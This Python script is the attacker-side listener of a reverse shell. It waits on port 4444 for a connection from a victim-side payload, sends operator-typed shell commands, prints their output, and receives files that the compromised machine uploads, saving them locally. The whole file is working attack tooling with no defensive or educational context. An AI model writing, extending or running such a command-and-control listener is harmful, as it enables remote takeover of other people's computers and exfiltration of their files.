import socket as net
import json

# Configuration
LISTENER_IP = "0.0.0.0"
LISTENER_PORT = 4444

def start_server():
    server = net.socket(net.AF_INET, net.SOCK_STREAM)
    # Allows you to restart the listener immediately without "Port already in use" errors
    server.setsockopt(net.SOL_SOCKET, net.SO_REUSEADDR, 1)
    
    server.bind((LISTENER_IP, LISTENER_PORT))
    server.listen(5)
    
    print(f"[+] Listening for incoming connections on {LISTENER_PORT}...")
    
    client, addr = server.accept()
    print(f"[+] Connection established with {addr}")

    while True:
        try:
            cmd = input("Shell> ")
            if not cmd:
                continue
                
            if cmd == "exit":
                client.send(cmd.encode())
                break
            
            # Send the command
            client.send(cmd.encode())
            
            # Receive response
            # We use a larger buffer to catch the JSON headers or small command outputs
            response = client.recv(1024 * 4)
            
            # --- FILE TRANSFER LOGIC ---
            # Try to see if the response is a JSON "Label"
            try:
                response_str = response.decode()
                
                # Check if it looks like JSON before parsing (optimization)
                if response_str.startswith("{") and "filename" in response_str:
                    label = json.loads(response_str)
                    
                    if label.get("action") == "download":
                        filename = label["filename"]
                        filesize = label["filesize"]
                        
                        print(f"[*] Incoming file: {filename} ({filesize} bytes)")
                        
                        # Handshake: Tell payload we are ready
                        client.send(b"OK")
                        
                        # Receive file data
                        received_data = bytearray()
                        while len(received_data) < filesize:
                            chunk = client.recv(4096)
                            received_data.extend(chunk)
                            
                        # Save the file
                        save_name = "downloaded_" + filename
                        with open(save_name, "wb") as f:
                            f.write(received_data)
                            
                        print(f"[+] Successfully saved to {save_name}")
                        continue # Skip the normal print at the bottom
            except json.JSONDecodeError:
                pass # It wasn't JSON, just normal text
            except Exception as e:
                print(f"Error handling data: {e}")

            # If it wasn't a file, just print the text output
            print(response.decode(errors='ignore'))
            
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            break
        except Exception as e:
            print(f"[-] Connection Error: {e}")
            break

    client.close()
    server.close()

if __name__ == "__main__":
    start_server()
  
